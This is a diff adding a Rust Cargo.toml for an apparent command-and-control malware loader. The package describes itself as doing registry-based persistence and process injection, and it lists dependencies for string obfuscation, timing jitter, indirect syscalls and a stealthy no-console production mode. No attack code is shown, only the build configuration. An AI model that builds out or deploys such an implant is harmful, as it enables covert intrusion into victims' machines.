@@ -1,0 +1,50 @@
+[package]
+name = "loader"
+version = "1.0.0"
+edition = "2021"
+description = "C2R2 Minimalist Loader - Registry-based persistence with process injection"
+
+[features]
+default = []
+production = []  # Production mode: stealthy execution, no console
+
+[[bin]]
+name = "loader"
+path = "src/main.rs"
+
+[dependencies]
+# Compile-time string obfuscation
+obfstr = "0.4"
+# Random number generation for jitter
+rand = "0.8"
+
+[target.'cfg(windows)'.dependencies]
+winapi = { version = "0.3", features = [
+    "processthreadsapi",
+    "handleapi",
+    "memoryapi",
+    "winbase",
+    "fileapi",
+    "errhandlingapi",
+    "synchapi",
+    "sysinfoapi",
+    "debugapi",
+    "libloaderapi",
+    "winnt",
+    "windef",
+    "winreg",
+    "tlhelp32",
+    "securitybaseapi"
+] }
+# Indirect syscalls - dinvk provides DInvoke-style syscall execution
+dinvk = "0.4"
+
+[target.'cfg(windows)'.build-dependencies]
+winres = "0.1.12"
+
+[profile.release]
+panic = "abort"
+lto = true
+codegen-units = 1
+opt-level = "z"
+strip = true
